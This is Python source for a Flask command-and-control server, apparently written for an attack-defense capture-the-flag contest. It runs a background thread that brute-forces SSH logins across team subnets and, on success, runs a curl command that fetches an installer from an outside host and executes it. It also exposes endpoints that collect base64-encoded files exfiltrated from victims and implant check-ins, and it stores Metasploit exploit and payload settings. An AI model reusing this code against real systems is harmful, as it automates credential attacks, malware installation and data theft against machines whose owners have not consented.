import os
import random
import re
import string
import time
from base64 import b64decode
from datetime import datetime
from threading import Thread

import paramiko
from flask import Flask, request, render_template, flash, redirect, url_for
from flask_bootstrap import Bootstrap
from flask_sqlalchemy import SQLAlchemy

# Constants
PORT = 80
DEBUG = True
TEMPLATE_DIR = "templates"
DB_FILE = "c2.db"
LOG_FILE = "c2.log"

# Default settings
DEFAULT_SUBNET = "172.16.T.B"
DEFAULT_WHITELISTED_IPS = "127.0.0.1"
DEFAULT_FLAG_REGEX = "NCX\{[^\{\}]{1,100}\}"
DEFAULT_MALWARE_INSTALL = "curl -o installer http://test.alberttaglieri.us/USSDelogrand/combat/backdoors/installer && chmod +x installer && ./installer"
DEFAULT_SSH_BRUTEFORCE_INTERVAL = "30"
DEFAULT_SSH_BRUTEFORCE_TIMEOUT = "5"
DEFAULT_SPAM_INTERVAL_MIN = "5"
DEFAULT_SPAM_INTERVAL_MAX = "20"

# Create Flask and database
app = Flask(__name__, template_folder=TEMPLATE_DIR)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///" + DB_FILE
app.secret_key = "CyberChef2"
db = SQLAlchemy(app)
Bootstrap(app)


def main():
    # Create the database
    db.create_all()

    # Create default settings
    add_setting("subnet", DEFAULT_SUBNET,
                "Subnet teams are on, T should replace team number and B should replace box IP")
    add_setting("whitelisted_ips", DEFAULT_WHITELISTED_IPS,
                "IPs, separated by commas and no spaces, that are allowed to access admin site")
    add_setting("flag_regex", DEFAULT_FLAG_REGEX, "Regex to search for flags with")
    add_setting("malware install", DEFAULT_MALWARE_INSTALL, "Command to install malware")
    add_setting("ssh_bruteforce_interval", DEFAULT_SSH_BRUTEFORCE_INTERVAL,
                "Seconds to wait between each SSH bruteforce")
    add_setting("ssh_bruteforce_timeout", DEFAULT_SSH_BRUTEFORCE_TIMEOUT,
                "Seconds to wait for timeout during SSH bruteforce")
    add_setting("spam_interval_min", DEFAULT_SPAM_INTERVAL_MIN, "Minimum seconds to wait between each spam")
    add_setting("spam_interval_max", DEFAULT_SPAM_INTERVAL_MAX, "Maximum seconds to wait between each spam")

    # Start threads
    ssh_bruteforce_thread = Thread(target=ssh_bruteforce)
    spam_thread = Thread(target=spam)
    ssh_bruteforce_thread.start()
    spam_thread.start()

    # Start Flask
    app.run(port=PORT, debug=DEBUG)


# <editor-fold desc="Admin Endpoints">

# Catch all 404s and 405s
@app.errorhandler(404)
@app.errorhandler(405)
def catch_all(e):
    return ""


# Protect the admin routes
@app.before_request
def check_admin():
    settings = Setting.query.get("whitelisted_ips")
    ips = settings.value.split(",")
    if request.path.startswith("/admin") and request.remote_addr not in ips:
        log("flask", f"{request.remote_addr} tried to access {request.path}")
        return ""


@app.route("/admin", methods=["GET"])
def admin_home():
    return render_template("home.html", total_boxes=Box.query.count(),
                           pwned_boxes=Box.query.filter_by(pwned=True).count(),
                           flag_boxes=Box.query.filter_by(flags=True).count(),
                           flags_found=Flag.query.count(),
                           flags_submitted=Flag.query.filter(Flag.submitted.isnot(None)).count())


@app.route("/admin/map", methods=["GET"])
def admin_map():
    return render_template("map.html")


@app.route("/admin/settings", methods=["GET"])
def admin_settings():
    return render_template("settings.html", settings=Setting.query.all())


@app.route("/admin/settings/update", methods=["POST"])
def admin_settings_update():
    # Get form data
    name = request.form.get("name")
    value = request.form.get("value")

    # Update in database
    setting = Setting.query.get(name)
    setting.value = value
    db.session.commit()

    # Flash and redirect
    flash("Setting updated")
    log("admin", f"setting {name} changed to {value} by {request.remote_addr}")
    return redirect(url_for("admin_settings"))


@app.route("/admin/logs", methods=["GET"])
def admin_logs():
    # Get parameters
    type = request.args.get("type")
    num = request.args.get("num")
    if type == "all":
        type = None

    # Query database
    if not num:
        num = 100
    else:
        num = int(num)
    if type:
        logs = Log.query.filter_by(type=type).order_by(Log.datetime.desc()).limit(num).all()
    else:
        type = "all"
        logs = Log.query.order_by(Log.datetime.desc()).limit(num).all()

    return render_template("logs.html", logs=logs, selected_type=type,
                           types=db.session.query(Log.type).distinct().all()[0], num=num)


@app.route("/admin/teams", methods=["GET"])
def admin_teams():
    return render_template("teams.html", teams=Team.query.order_by(Team.num).all())


@app.route("/admin/teams/add", methods=["POST"])
def admin_teams_add():
    # Get form data
    num = request.form.get("num")
    name = request.form.get("name")

    # Add to database
    db.session.add(Team(num, name))
    for service in Service.query.all():
        db.session.add(Box(num, service.ip, False, None, False, None))
    db.session.commit()

    # Flash and redirect
    flash("Team added")
    log("admin", f"team {num} added by {request.remote_addr}")
    return redirect(url_for("admin_teams"))


@app.route("/admin/teams/delete", methods=["GET"])
def admin_teams_delete():
    # Get parameters
    num = request.args.get("num")

    # Delete from database
    team = Team.query.get(num)
    db.session.delete(team)
    db.session.commit()

    # Flash and redirect
    flash("Team deleted")
    log("admin", f"team {num} deleted by {request.remote_addr}")
    return redirect(url_for("admin_teams"))


@app.route("/admin/teams/update", methods=["POST"])
def admin_teams_update():
    # Get form data
    num = request.form.get("num")
    name = request.form.get("name")

    # Update in database
    team = Team.query.get(num)
    team.name = name
    db.session.commit()

    # Flash and redirect
    flash("Team updated")
    log("admin", f"team {num} updated by {request.remote_addr}")
    return redirect(url_for("admin_teams"))


@app.route("/admin/services", methods=["GET"])
def admin_services():
    return render_template("services.html", services=Service.query.order_by(Service.ip).all())


@app.route("/admin/services/add", methods=["POST"])
def admin_services_add():
    # Get form data
    ip = request.form.get("ip")
    name = request.form.get("name")
    port = request.form.get("port")
    ssh_port = request.form.get("ssh_port")

    # Add to database
    db.session.add(Service(ip, name, port, ssh_port))
    for team in Team.query.all():
        db.session.add(Box(team.num, ip, False, None, False, None))
    db.session.commit()

    # Flash and redirect
    flash("Service added")
    log("admin", f"service {ip} added by {request.remote_addr}")
    return redirect(url_for("admin_services"))


@app.route("/admin/services/delete", methods=["GET"])
def admin_services_delete():
    # Get parameters
    ip = request.args.get("ip")

    # Delete from database
    service = Service.query.get(ip)
    db.session.delete(service)
    db.session.commit()

    # Flash and redirect
    flash("Service deleted")
    log("admin", f"service {ip} deleted by {request.remote_addr}")
    return redirect(url_for("admin_services"))


@app.route("/admin/services/update", methods=["POST"])
def admin_services_update():
    # Get form data
    ip = request.form.get("ip")
    name = request.form.get("name")
    port = request.form.get("port")
    ssh_port = request.form.get("ssh_port")

    # Update in database
    service = Service.query.get(ip)
    service.name = name
    service.port = port
    service.ssh_port = ssh_port
    db.session.commit()

    # Flash and redirect
    flash("Service updated")
    log("admin", f"service {ip} updated by {request.remote_addr}")
    return redirect(url_for("admin_services"))


@app.route("/admin/boxes", methods=["GET"])
def admin_boxes():
    return render_template("boxes.html", boxes=Box.query.order_by(Box.team_num, Box.service_ip).all(),
                           subnet=half_subnet())


@app.route("/admin/flags", methods=["GET"])
def admin_flags():
    return render_template("flags.html", flags=Flag.query.order_by(Flag.found.desc()).all(), subnet=half_subnet())


@app.route("/admin/exfils", methods=["GET"])
def admin_exfils():
    return render_template("exfils.html", exfils=ExfilData.query.order_by(ExfilData.found.desc()).all(),
                           subnet=half_subnet())


@app.route("/admin/exfils/view", methods=["GET"])
def admin_exfils_view():
    # Get parameters
    id = request.args.get("id")

    # Get from database
    exfil_data = ExfilData.query.get(id)

    # Return the data
    log("admin", f"exfil {id} viewed by {request.remote_addr}")
    return exfil_data.data


@app.route("/admin/msfs", methods=["GET"])
def admin_msfs():
    return render_template("msfs.html", msfs=MSFExploit.query.all(), services=Service.query.order_by(Service.ip).all())


@app.route("/admin/msfs/add", methods=["POST"])
def admin_msfs_add():
    # Get form data
    service_ip = request.form.get("service_ip")
    exploit = request.form.get("exploit")
    options = request.form.get("options")
    payload = request.form.get("payload")

    # Add to database
    db.session.add(MSFExploit(service_ip, exploit, options, payload, None))
    db.session.commit()

    # Flash and redirect
    flash("MSF exploit added")
    log("admin", f"MSF exploit added by {request.remote_addr}")
    return redirect(url_for("admin_msfs"))


@app.route("/admin/msfs/delete", methods=["GET"])
def admin_msfs_delete():
    # Get parameters
    id = request.args.get("id")

    # Delete from database
    msf_exploit = MSFExploit.query.get(id)
    db.session.delete(msf_exploit)
    db.session.commit()

    # Flash and redirect
    flash("MSF exploit deleted")
    log("admin", f"MSF exploit {id} deleted by {request.remote_addr}")
    return redirect(url_for("admin_msfs"))


@app.route("/admin/msfs/update", methods=["POST"])
def admin_msfs_update():
    # Get form data
    id = request.form.get("id")
    service_ip = request.form.get("service_ip")
    exploit = request.form.get("exploit")
    options = request.form.get("options")
    payload = request.form.get("payload")

    # Update in database
    msf_exploit = MSFExploit.query.get(id)
    msf_exploit.service_ip = service_ip
    msf_exploit.exploit = exploit
    msf_exploit.options = options
    msf_exploit.payload = payload
    db.session.commit()

    # Flash and redirect
    flash("MSF exploit updated")
    log("admin", f"MSF exploit {id} updated by {request.remote_addr}")
    return redirect(url_for("admin_msfs"))


@app.route("/admin/flagrets", methods=["GET"])
def admin_flagrets():
    return render_template("flagrets.html", flagrets=FlagRetrieval.query.all(),
                           services=Service.query.order_by(Service.ip).all())


@app.route("/admin/flagrets/add", methods=["POST"])
def admin_flagrets_add():
    # Get form data
    service_ip = request.form.get("service_ip")
    root_shell = str_to_bool(request.form.get("root_shell"))
    command = request.form.get("command")

    # Add to database
    db.session.add(FlagRetrieval(service_ip, root_shell, command))
    db.session.commit()

    # Flash and redirect
    flash("Flag retrieval added")
    log("admin", f"flag retrieval added by {request.remote_addr}")
    return redirect(url_for("admin_flagrets"))


@app.route("/admin/flagrets/delete", methods=["GET"])
def admin_flagrets_delete():
    # Get parameters
    id = request.args.get("id")

    # Delete from database
    flag_retrieval = FlagRetrieval.query.get(id)
    db.session.delete(flag_retrieval)
    db.session.commit()

    # Flash and redirect
    flash("Flag retrieval deleted")
    log("admin", f"flag retrieval {id} deleted by {request.remote_addr}")
    return redirect(url_for("admin_flagrets"))


@app.route("/admin/flagrets/update", methods=["POST"])
def admin_flagrets_update():
    # Get form data
    id = request.form.get("id")
    service_ip = request.form.get("service_ip")
    root_shell = str_to_bool(request.form.get("root_shell"))
    command = request.form.get("command")

    # Update in database
    flag_retrieval = FlagRetrieval.query.get(id)
    flag_retrieval.service_ip = service_ip
    flag_retrieval.root_shell = root_shell
    flag_retrieval.command = command
    db.session.commit()

    # Flash and redirect
    flash("Flag retrieval updated")
    log("admin", f"flag retrieval {id} updated by {request.remote_addr}")
    return redirect(url_for("admin_flagrets"))


@app.route("/admin/ssh", methods=["GET"])
def admin_ssh():
    return render_template("ssh.html", usernames=SSHUsername.query.order_by(SSHUsername.username).all(),
                           passwords=SSHPassword.query.order_by(SSHPassword.password).all())


@app.route("/admin/ssh/usernames/add", methods=["POST"])
def admin_ssh_usernames_add():
    # Get form data
    username = request.form.get("username")

    # Add to database
    db.session.add(SSHUsername(username))
    db.session.commit()

    # Flash and redirect
    flash("SSH username added")
    log("admin", f"SSH username {username} added by {request.remote_addr}")
    return redirect(url_for("admin_ssh"))


@app.route("/admin/ssh/passwords/add", methods=["POST"])
def admin_ssh_passwords_add():
    # Get form data
    password = request.form.get("password")

    # Add to database
    db.session.add(SSHPassword(password))
    db.session.commit()

    # Flash and redirect
    flash("SSH password added")
    log("admin", f"SSH password {password} added by {request.remote_addr}")
    return redirect(url_for("admin_ssh"))


@app.route("/admin/ssh/usernames/delete", methods=["GET"])
def admin_ssh_usernames_delete():
    # Get parameters
    username = request.args.get("username")

    # Delete from database
    ssh_username = SSHUsername.query.get(username)
    db.session.delete(ssh_username)
    db.session.commit()

    # Flash and redirect
    flash("SSH username deleted")
    log("admin", f"SSH username {username} deleted by {request.remote_addr}")
    return redirect(url_for("admin_ssh"))


@app.route("/admin/ssh/passwords/delete", methods=["GET"])
def admin_ssh_passwords_delete():
    # Get parameters
    password = request.args.get("password")

    # Delete from database
    ssh_password = SSHPassword.query.get(password)
    db.session.delete(ssh_password)
    db.session.commit()

    # Flash and redirect
    flash("SSH password deleted")
    log("admin", f"SSH password {password} deleted by {request.remote_addr}")
    return redirect(url_for("admin_ssh"))


@app.route("/admin/ssh/usernames/update", methods=["POST"])
def admin_ssh_usernames_update():
    # Get form data
    old_username = request.form.get("old_username")
    username = request.form.get("username")

    # Update in database
    ssh_username = SSHUsername.query.get(old_username)
    ssh_username.username = username
    db.session.commit()

    # Flash and redirect
    flash("SSH username updated")
    log("admin", f"SSH username {username} updated by {request.remote_addr}")
    return redirect(url_for("admin_ssh"))


@app.route("/admin/ssh/passwords/update", methods=["POST"])
def admin_ssh_passwords_update():
    # Get form data
    old_password = request.form.get("old_password")
    password = request.form.get("password")

    # Update in database
    ssh_password = SSHPassword.query.get(old_password)
    ssh_password.password = password
    db.session.commit()

    # Flash and redirect
    flash("SSH password updated")
    log("admin", f"SSH password {password} updated by {request.remote_addr}")
    return redirect(url_for("admin_ssh"))


# </editor-fold>

# <editor-fold desc="Malware Endpoints">

# Exfil route
@app.route("/e", methods=["POST"])
def exfil():
    # Get form data
    victimip = request.form.get("victimip")
    filename = request.form.get("filename")
    data = request.form.get("file")

    # Check if it exists
    if not victimip:
        log("exfil_endpoint", f"victimip missing from {request.remote_addr}")
        return ""
    elif not filename:
        log("exfil_endpoint", f"filename missing from {request.remote_addr}")
        return ""
    elif not data:
        log("exfil_endpoint", f"data missing from {request.remote_addr}")
        return ""

    # Decode data
    try:
        exfil = b64decode(data).decode("utf-8")
    except:
        log("exfil_endpoint", f"b64 decode error on victimip {victimip} from {request.remote_addr}")
        return ""

    # Get team and service
    try:
        team = victimip.split(".")[2]
        service = victimip.split(".")[3]
    except:
        log("exfil_endpoint", f"error decoding IP {victimip} from {request.remote_addr}")
        return ""

    # Save the data and extract flags
    try:
        db.session.add(ExfilData(team, service, filename, exfil, datetime.now()))
        db.session.commit()
    except:
        log("exfil_endpoint",
            f"error adding data for team {team} and service {service} for file {filename} from {request.remote_addr}")
        return ""
    extract_flags(exfil, team, service, "exfil")
    log("exfil_endpoint", f"saved data from team {team} and service {service} from {request.remote_addr}")
    return ""


# Update route
@app.route("/u", methods=["POST"])
def update():
    # Get form data
    victimip = request.form.get("victimip")

    # Check if it exists
    if not victimip:
        log("update_endpoint", f"victimip missing from {request.remote_addr}")
        return ""

    # Get team and service
    try:
        team = victimip.split(".")[2]
        service = victimip.split(".")[3]
    except:
        log("update_endpoint", f"error decoding IP {victimip} from {request.remote_addr}")
        return ""

    # Get the Box
    box = Box.query.get((team, service))
    if not box:
        log("update_endpoint", f"no record for team {team} and service {service} from {request.remote_addr}")
        return ""

    # Update the Box
    box.pwned = True
    box.last_update = datetime.now()
    db.session.commit()

    # Return the status
    log("update_endpoint", f"status {box.status} sent to team {team} and service {service} from {request.remote_addr}")
    return box.status


# </editor-fold>

# <editor-fold desc="Thread Functions">

def ssh_bruteforce():
    # Setup SSH client
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    # Get settings from database
    subnet = Setting.query.get("subnet").value
    malware_install = Setting.query.get("malware_install").value
    try:
        interval = int(Setting.query.get("ssh_bruteforce_interval").value)
    except:
        log("ssh_bruteforce", "Invalid ssh_bruteforce_interval setting")
        interval = DEFAULT_SSH_BRUTEFORCE_INTERVAL
    try:
        timeout = int(Setting.query.get("ssh_bruteforce_timeout").value)
    except:
        log("ssh_bruteforce", "Invalid ssh_bruteforce_timeout setting")
        timeout = DEFAULT_SSH_BRUTEFORCE_TIMEOUT

    # Continue trying
    while True:

        # Get boxes that are not pwned
        boxes = Box.query.filter_by(pwned=False).all()

        # Iterate over boxes
        for box in boxes:

            # Get box IP
            ip = subnet.replace("T", box.team_num).replace("B", box.service_ip)

            # Get SSH usernames and passwords
            usernames = SSHUsername.query.all()
            passwords = SSHPassword.query.all()

            # Iterate over usernames and passwords
            for username in usernames:
                for password in passwords:
                    log("ssh_bruteforce",
                        f"trying {ip}:{box.ssh_port} with username {username} and password {password}")

                    # Try to SSH
                    try:
                        client.connect(
                            ip, port=box.ssh_port, username=username, password=password, timeout=timeout,
                            banner_timeout=timeout, auth_timeout=timeout)
                    except:
                        log("ssh_bruteforce",
                            f"failed to {ip}:{box.ssh_port} with username {username} and password {password}")
                        continue
                    log("ssh_bruteforce",
                        f"success to {ip}:{box.ssh_port} with username {username} and password {password}")

                    # Install malware
                    ssh_cmd(client, malware_install)

                    # Close the connection
                    client.close()

                    # Wait until next try
                    log("ssh_bruteforce", f"sleeping for {interval} seconds")
                    time.sleep(interval)


def spam():
    return


# </editor-fold>

# <editor-fold desc="Helper Functions">

def half_subnet():
    parts = Setting.query.get("subnet").value.split(".")
    return f"{parts[0]}.{parts[1]}."


def add_setting(name, default, description):
    if not Setting.query.get(name):
        db.session.add(Setting(name, default, description))
        db.session.commit()


def extract_flags(data, team_num, service_ip, source):
    # Find and add the new flags to the database
    regex = re.compile(Setting.query.get("flag_regex"))
    flags = re.findall(regex, data)
    new_flags = []
    for flag in flags:
        if not Flag.query.get(flag):
            new_flag = Flag(flag, team_num, service_ip, source, datetime.now(), None)
            new_flags.append(new_flag)
            db.session.add(new_flag)
            db.session.commit()
            log("extract_flags", f"new flag {flag} added from team {team_num} and service {service_ip} from {source}")

    # Submit the flags
    for flag in new_flags:
        # TODO: submit the flag and check for success
        success = True
        if success:
            flag.submitted = datetime.now()
            db.session.commit()
            log("extract_flags",
                f"flag {flag} successfully submitted from team {team_num} and service {service_ip} from {source}")


def ssh_cmd(client, command):
    log("ssh_bruteforce", f"running command '{command}'")
    stdin, stdout, stderr = client.exec_command(command)
    stdout = stdout.read().decode("utf-8")
    stderr = stderr.read().decode("utf-8")
    log("ssh_bruteforce", f"stdout: '{stdout}'")
    log("ssh_bruteforce", f"stderr: '{stderr}'")
    return stdout


def random_string(strings):
    result = ""
    for _ in range(5, 10):
        result += random.choice(strings) + "\n"
    return result


def random_characters():
    letter = random.choice(string.ascii_letters)
    return letter * random.randint(30, 150)


def random_binary():
    return os.urandom(random.randint(50, 200))


def log(type, message):
    # Add to database
    db.session.add(Log(type, datetime.now(), message))
    db.session.commit()

    # Write to log file
    with open(LOG_FILE, "a+") as f:
        f.write(f"[{type}] [{datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {message}\n")


def str_to_bool(s):
    if s == "True":
        return True
    elif s == "False":
        return False
    else:
        return None


# </editor-fold>

# <editor-fold desc="Objects">

class Log(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    type = db.Column(db.Text, nullable=False)
    datetime = db.Column(db.DateTime, nullable=False)
    message = db.Column(db.Text, nullable=False)

    def __init__(self, type, datetime, message):
        self.type = type
        self.datetime = datetime
        self.message = message


class Setting(db.Model):
    name = db.Column(db.Text, primary_key=True)
    value = db.Column(db.Text, nullable=False)
    description = db.Column(db.Text, nullable=False)

    def __init__(self, name, value, description):
        self.name = name
        self.value = value
        self.description = description


class Team(db.Model):
    num = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.Text, nullable=False)

    def __init__(self, num, name):
        self.num = num
        self.name = name


class Service(db.Model):
    ip = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.Integer, nullable=False)
    port = db.Column(db.Integer, nullable=False)
    ssh_port = db.Column(db.Integer, nullable=False)

    def __init__(self, ip, name, port, ssh_port):
        self.ip = ip
        self.name = name
        self.port = port
        self.ssh_port = ssh_port


class Box(db.Model):
    team_num = db.Column(db.Integer, db.ForeignKey("team.num"), primary_key=True)
    team = db.relationship(Team, backref=db.backref("boxes", cascade="all, delete-orphan"))
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), primary_key=True)
    service = db.relationship(Service, backref=db.backref("boxes", cascade="all, delete-orphan"))
    pwned = db.Column(db.Boolean, nullable=False)
    last_update = db.Column(db.DateTime, nullable=True)
    flags = db.Column(db.Boolean, nullable=False)
    last_flag = db.Column(db.DateTime, nullable=True)

    def __init__(self, team_num, service_ip, pwned, last_update, flags, last_flag):
        self.team_num = team_num
        self.service_ip = service_ip
        self.pwned = pwned
        self.last_update = last_update
        self.flags = flags
        self.last_flag = last_flag


class Flag(db.Model):
    flag = db.Column(db.Text, primary_key=True)
    team_num = db.Column(db.Integer, db.ForeignKey("team.num"), nullable=False)
    team = db.relationship(Team, backref=db.backref("flags", cascade="all, delete-orphan"))
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    service = db.relationship(Service, backref=db.backref("flags", cascade="all, delete-orphan"))
    source = db.Column(db.Text, nullable=False)
    found = db.Column(db.DateTime, nullable=False)
    submitted = db.Column(db.DateTime, nullable=True)

    def __init__(self, flag, team_num, service_ip, source, found, submitted):
        self.flag = flag
        self.team_num = team_num
        self.service_ip = service_ip
        self.source = source
        self.found = found
        self.submitted = submitted


class ExfilData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    team_num = db.Column(db.Integer, db.ForeignKey("team.num"), nullable=False)
    team = db.relationship(Team, backref=db.backref("exfil_data", cascade="all, delete-orphan"))
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    service = db.relationship(Service, backref=db.backref("exfil_data", cascade="all, delete-orphan"))
    filename = db.Column(db.Text, nullable=False)
    data = db.Column(db.Text, nullable=False)
    found = db.Column(db.DateTime, nullable=False)

    def __init__(self, team_num, service_ip, filename, data, found):
        self.team_num = team_num
        self.service_ip = service_ip
        self.filename = filename
        self.data = data
        self.found = found


class MSFExploit(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    service = db.relationship(Service, backref=db.backref("msf_exploits", cascade="all, delete-orphan"))
    exploit = db.Column(db.Text, nullable=False)
    options = db.Column(db.Text, nullable=False)
    payload = db.Column(db.Text, nullable=False)
    last_success = db.Column(db.DateTime, nullable=True)

    def __init__(self, service_ip, exploit, options, payload, last_success):
        self.service_ip = service_ip
        self.exploit = exploit
        self.options = options
        self.payload = payload
        self.last_success = last_success


class FlagRetrieval(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    service = db.relationship(Service, backref=db.backref("flag_retrievals", cascade="all, delete-orphan"))
    root_shell = db.Column(db.Boolean, nullable=False)
    command = db.Column(db.Text, nullable=False)

    def __init__(self, service_ip, root_shell, command):
        self.service_ip = service_ip
        self.root_shell = root_shell
        self.command = command


class SSHUsername(db.Model):
    username = db.Column(db.Text, primary_key=True)

    def __init__(self, username):
        self.username = username


class SSHPassword(db.Model):
    password = db.Column(db.Text, primary_key=True)

    def __init__(self, password):
        self.password = password


# </editor-fold>

if __name__ == "__main__":
    main()
